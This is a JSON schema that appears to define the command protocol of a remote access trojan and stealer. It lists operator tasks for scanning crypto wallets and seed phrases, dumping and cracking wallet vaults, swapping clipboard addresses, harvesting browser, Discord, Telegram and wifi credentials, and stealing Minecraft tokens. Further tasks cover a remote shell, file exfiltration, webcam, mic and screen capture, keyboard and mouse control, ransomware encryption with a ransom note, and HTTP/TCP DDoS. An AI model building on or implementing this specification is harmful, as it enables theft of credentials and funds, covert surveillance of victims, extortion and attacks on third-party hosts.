{
  "$id": "spc:tasks:v1",
  "types": {
    "scan_wallets": {
      "transport": "http",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "include_desktop": {
            "type": "boolean",
            "default": true
          },
          "include_extensions": {
            "type": "boolean",
            "default": true
          },
          "include_seeds": {
            "type": "boolean",
            "default": true
          },
          "max_files": {
            "type": "integer",
            "minimum": 1,
            "maximum": 20000,
            "default": 4000
          },
          "max_bytes": {
            "type": "integer",
            "minimum": 1048576,
            "maximum": 536870912,
            "default": 268435456
          }
        }
      },
      "result": {
        "type": "object",
        "required": [
          "wallets",
          "seeds",
          "elapsed_ms"
        ],
        "properties": {
          "wallets": {
            "type": "array",
            "items": {
              "$ref": "#/$defs/wallet"
            }
          },
          "seeds": {
            "type": "array",
            "items": {
              "$ref": "#/$defs/seed"
            }
          },
          "elapsed_ms": {
            "type": "integer"
          },
          "truncated": {
            "type": "boolean"
          }
        }
      }
    },
    "dump_vault": {
      "transport": "http",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "required": [
          "target"
        ],
        "properties": {
          "target": {
            "type": "string",
            "pattern": "^[a-z0-9_.-]{1,64}$"
          },
          "profile": {
            "type": "string",
            "enum": [
              "lite",
              "full"
            ]
          }
        }
      },
      "result": {
        "type": "object",
        "required": [
          "target",
          "artifacts",
          "upload_id"
        ],
        "properties": {
          "target": {
            "type": "string"
          },
          "artifacts": {
            "type": "integer"
          },
          "bytes": {
            "type": "integer"
          },
          "upload_id": {
            "type": "string",
            "format": "uuid"
          },
          "status": {
            "type": "string",
            "enum": [
              "queued",
              "uploaded",
              "partial"
            ]
          }
        }
      }
    },
    "crack_vault": {
      "transport": "http",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "required": [
          "target"
        ],
        "properties": {
          "target": {
            "type": "string"
          },
          "max_seconds": {
            "type": "integer",
            "minimum": 5,
            "maximum": 600,
            "default": 90
          },
          "max_cpu_pct": {
            "type": "integer",
            "minimum": 10,
            "maximum": 100,
            "default": 50
          },
          "wordlist": {
            "type": "string",
            "maxLength": 4096,
            "default": ""
          }
        }
      },
      "result": {
        "type": "object",
        "required": [
          "target",
          "found",
          "attempts"
        ],
        "properties": {
          "target": {
            "type": "string"
          },
          "found": {
            "type": "boolean"
          },
          "password": {
            "type": [
              "string",
              "null"
            ]
          },
          "attempts": {
            "type": "integer"
          },
          "elapsed_ms": {
            "type": "integer"
          }
        }
      }
    },
    "clip_start": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "replace": {
            "type": "boolean",
            "default": false
          },
          "coins": {
            "type": "object",
            "additionalProperties": {
              "type": "array",
              "items": {
                "type": "string"
              }
            }
          },
          "max_history": {
            "type": "integer",
            "minimum": 16,
            "maximum": 5000,
            "default": 500
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "clip_stop": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "shell": {
      "transport": "http",
      "params": {
        "type": "object",
        "required": [
          "command"
        ],
        "properties": {
          "command": {
            "type": "string",
            "maxLength": 8192
          },
          "timeout_sec": {
            "type": "integer",
            "minimum": 1,
            "maximum": 120,
            "default": 60
          }
        }
      },
      "result": {
        "type": "object",
        "properties": {
          "exit": {
            "type": "integer"
          },
          "output": {
            "type": "string"
          }
        }
      }
    },
    "harvest": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "kind": {
            "type": "string",
            "enum": [
              "all",
              "browsers",
              "discord",
              "telegram",
              "wifi",
              "productkey"
            ],
            "default": "all"
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "screenshot": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false
      },
      "result": {
        "$ref": "#/$defs/artifact"
      }
    },
    "file_pull": {
      "transport": "frame",
      "params": {
        "type": "object",
        "required": [
          "path"
        ],
        "properties": {
          "path": {
            "type": "string",
            "maxLength": 4096
          },
          "max_mb": {
            "type": "integer",
            "minimum": 1,
            "maximum": 256,
            "default": 64
          }
        }
      },
      "result": {
        "$ref": "#/$defs/artifact"
      }
    },
    "cancel": {
      "transport": "frame",
      "params": {
        "type": "object",
        "required": [
          "task_id"
        ],
        "properties": {
          "task_id": {
            "type": "string",
            "format": "uuid"
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "agent": {
      "transport": "http",
      "params": {
        "type": "object",
        "required": [
          "command"
        ],
        "properties": {
          "command": {
            "type": "string",
            "maxLength": 512
          }
        }
      },
      "result": {
        "type": "object",
        "properties": {
          "output": {
            "type": "string"
          },
          "ok": {
            "type": "boolean"
          }
        }
      }
    },
    "monitor": {
      "transport": "http",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "seconds": {
            "type": "integer",
            "minimum": 1,
            "maximum": 30,
            "default": 5
          },
          "fps": {
            "type": "number",
            "minimum": 0.2,
            "maximum": 5,
            "default": 1
          },
          "quality": {
            "type": "integer",
            "minimum": 20,
            "maximum": 90,
            "default": 60
          },
          "max_frames": {
            "type": "integer",
            "minimum": 1,
            "maximum": 30,
            "default": 5
          }
        }
      },
      "result": {
        "type": "object",
        "required": [
          "frames",
          "count",
          "width",
          "height"
        ],
        "properties": {
          "frames": {
            "type": "array",
            "items": {
              "type": "object",
              "required": [
                "ts",
                "data"
              ],
              "properties": {
                "ts": {
                  "type": "integer"
                },
                "data": {
                  "type": "string",
                  "contentEncoding": "base64"
                }
              }
            }
          },
          "count": {
            "type": "integer"
          },
          "width": {
            "type": "integer"
          },
          "height": {
            "type": "integer"
          },
          "elapsed_ms": {
            "type": "integer"
          }
        }
      }
    },
    "files": {
      "transport": "http",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "required": [
          "action",
          "path"
        ],
        "properties": {
          "action": {
            "type": "string",
            "enum": [
              "list",
              "upload",
              "mkdir",
              "rename",
              "delete",
              "compress"
            ]
          },
          "path": {
            "type": "string",
            "maxLength": 4096
          },
          "to": {
            "type": "string",
            "maxLength": 4096
          },
          "url": {
            "type": "string",
            "maxLength": 8192
          },
          "max_mb": {
            "type": "integer",
            "minimum": 1,
            "maximum": 256,
            "default": 64
          }
        }
      },
      "result": {
        "type": "object",
        "required": [
          "ok",
          "action",
          "path"
        ],
        "properties": {
          "ok": {
            "type": "boolean"
          },
          "action": {
            "type": "string"
          },
          "path": {
            "type": "string"
          },
          "to": {
            "type": "string"
          },
          "entries": {
            "type": "array",
            "items": {
              "type": "object",
              "properties": {
                "name": {
                  "type": "string"
                },
                "dir": {
                  "type": "boolean"
                },
                "size": {
                  "type": "integer"
                }
              }
            }
          },
          "upload_id": {
            "type": "string",
            "format": "uuid"
          },
          "bytes": {
            "type": "integer"
          }
        }
      }
    },
    "webcam": {
      "transport": "http",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "device": {
            "type": "string",
            "maxLength": 256
          }
        }
      },
      "result": {
        "$ref": "#/$defs/artifact"
      }
    },
    "mic": {
      "transport": "http",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "seconds": {
            "type": "integer",
            "minimum": 1,
            "maximum": 60,
            "default": 5
          },
          "device": {
            "type": "string",
            "maxLength": 256
          }
        }
      },
      "result": {
        "$ref": "#/$defs/artifact"
      }
    },
    "ransomware": {
      "transport": "http",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "required": [
          "action",
          "path"
        ],
        "properties": {
          "action": {
            "type": "string",
            "enum": [
              "encrypt",
              "decrypt",
              "status"
            ]
          },
          "path": {
            "type": "string",
            "maxLength": 4096
          },
          "note": {
            "type": "string",
            "maxLength": 2000
          }
        }
      },
      "result": {
        "type": "object",
        "required": [
          "ok",
          "action",
          "path"
        ],
        "properties": {
          "ok": {
            "type": "boolean"
          },
          "action": {
            "type": "string"
          },
          "path": {
            "type": "string"
          },
          "files": {
            "type": "integer"
          },
          "bytes": {
            "type": "integer"
          },
          "marker": {
            "type": "string"
          },
          "note": {
            "type": "string"
          }
        }
      }
    },
    "ddos": {
      "transport": "http",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "required": [
          "method",
          "host",
          "port"
        ],
        "properties": {
          "method": {
            "type": "string",
            "enum": [
              "http",
              "tcp"
            ]
          },
          "host": {
            "type": "string",
            "maxLength": 512
          },
          "port": {
            "type": "integer",
            "minimum": 1,
            "maximum": 65535
          },
          "seconds": {
            "type": "integer",
            "minimum": 1,
            "maximum": 300,
            "default": 30
          },
          "concurrency": {
            "type": "integer",
            "minimum": 1,
            "maximum": 256,
            "default": 16
          }
        }
      },
      "result": {
        "type": "object",
        "required": [
          "sent",
          "errors",
          "elapsed_ms"
        ],
        "properties": {
          "sent": {
            "type": "integer"
          },
          "errors": {
            "type": "integer"
          },
          "elapsed_ms": {
            "type": "integer"
          },
          "status": {
            "type": "object"
          }
        }
      }
    },
    "clip_set": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "text": {
            "type": "string",
            "minLength": 1,
            "maxLength": 128
          }
        },
        "required": [
          "text"
        ]
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "webcam:snapshot": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "device": {
            "type": "string",
            "maxLength": 256
          },
          "quality": {
            "type": "integer",
            "minimum": 20,
            "maximum": 90,
            "default": 60
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "webcam:stream": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "device": {
            "type": "string",
            "maxLength": 256
          },
          "quality": {
            "type": "integer",
            "minimum": 20,
            "maximum": 90,
            "default": 55
          },
          "fps": {
            "type": "integer",
            "minimum": 1,
            "maximum": 15,
            "default": 8
          },
          "max_frames": {
            "type": "integer",
            "minimum": 1,
            "maximum": 120,
            "default": 32
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "webcam:devices": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {}
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "mic:record": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "seconds": {
            "type": "integer",
            "minimum": 1,
            "maximum": 60,
            "default": 15
          },
          "device": {
            "type": "string",
            "maxLength": 256
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "desktop:frame": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {
          "quality": {
            "type": "integer",
            "minimum": 20,
            "maximum": 90,
            "default": 60
          },
          "scale": {
            "type": "integer",
            "minimum": 480,
            "maximum": 1920,
            "default": 1280
          },
          "screen": {
            "type": "integer",
            "minimum": 0,
            "maximum": 8,
            "default": 0
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "desktop:screens": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {}
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "input:mouse": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "required": [
          "action",
          "x",
          "y"
        ],
        "properties": {
          "action": {
            "type": "string",
            "enum": [
              "move",
              "click",
              "up",
              "right",
              "double",
              "wheel"
            ]
          },
          "x": {
            "type": "integer",
            "minimum": 0,
            "maximum": 10000
          },
          "y": {
            "type": "integer",
            "minimum": 0,
            "maximum": 10000
          },
          "delta": {
            "type": "integer",
            "minimum": -10,
            "maximum": 10
          },
          "screen": {
            "type": "integer",
            "minimum": 0,
            "maximum": 8
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "input:key": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "required": [
          "action"
        ],
        "properties": {
          "action": {
            "type": "string",
            "enum": [
              "press",
              "down",
              "up"
            ]
          },
          "key": {
            "type": "string",
            "maxLength": 16
          },
          "vk": {
            "type": "integer",
            "minimum": 0,
            "maximum": 255
          },
          "modifiers": {
            "type": "array",
            "items": {
              "type": "string",
              "enum": [
                "ctrl",
                "shift",
                "alt",
                "meta",
                "win"
              ]
            }
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "clipboard:get": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {}
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "minecraft:token": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "properties": {}
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    },
    "input:batch": {
      "transport": "frame",
      "params": {
        "type": "object",
        "additionalProperties": false,
        "required": [
          "events"
        ],
        "properties": {
          "events": {
            "type": "array",
            "minItems": 1,
            "maxItems": 64,
            "items": {
              "type": "object",
              "additionalProperties": false,
              "required": [
                "t"
              ],
              "properties": {
                "t": {
                  "type": "string",
                  "enum": [
                    "m",
                    "c",
                    "r",
                    "w",
                    "k"
                  ]
                },
                "x": {
                  "type": "integer",
                  "minimum": 0,
                  "maximum": 10000
                },
                "y": {
                  "type": "integer",
                  "minimum": 0,
                  "maximum": 10000
                },
                "d": {
                  "type": "integer",
                  "minimum": -10,
                  "maximum": 10
                },
                "vk": {
                  "type": "integer",
                  "minimum": 0,
                  "maximum": 255
                },
                "key": {
                  "type": "string",
                  "maxLength": 16
                },
                "screen": {
                  "type": "integer",
                  "minimum": 0,
                  "maximum": 8
                },
                "mods": {
                  "type": "array",
                  "items": {
                    "type": "string",
                    "enum": [
                      "ctrl",
                      "shift",
                      "alt",
                      "meta",
                      "win"
                    ]
                  }
                }
              }
            }
          }
        }
      },
      "result": {
        "$ref": "#/$defs/ok"
      }
    }
  },
  "$defs": {
    "wallet": {
      "type": "object",
      "required": [
        "id",
        "kind",
        "path",
        "state"
      ],
      "properties": {
        "id": {
          "type": "string"
        },
        "kind": {
          "type": "string",
          "enum": [
            "extension",
            "desktop",
            "keystore",
            "core",
            "seed_file",
            "creds"
          ]
        },
        "path": {
          "type": "string"
        },
        "state": {
          "type": "string",
          "enum": [
            "found",
            "decrypted",
            "locked",
            "unsupported",
            "corrupt"
          ]
        },
        "reason": {
          "type": "string"
        },
        "address": {
          "type": "string"
        },
        "balance": {
          "type": "string"
        },
        "crackable": {
          "type": "boolean"
        }
      }
    },
    "seed": {
      "type": "object",
      "required": [
        "path",
        "kind",
        "value"
      ],
      "properties": {
        "path": {
          "type": "string"
        },
        "kind": {
          "type": "string",
          "enum": [
            "bip39",
            "hex",
            "wif",
            "base58",
            "keystore_json"
          ]
        },
        "value": {
          "type": "string"
        },
        "words": {
          "type": "integer"
        }
      }
    },
    "ok": {
      "type": "object",
      "properties": {
        "ok": {
          "type": "boolean"
        }
      }
    },
    "artifact": {
      "type": "object",
      "required": [
        "upload_id"
      ],
      "properties": {
        "upload_id": {
          "type": "string",
          "format": "uuid"
        },
        "bytes": {
          "type": "integer"
        }
      }
    }
  }
}
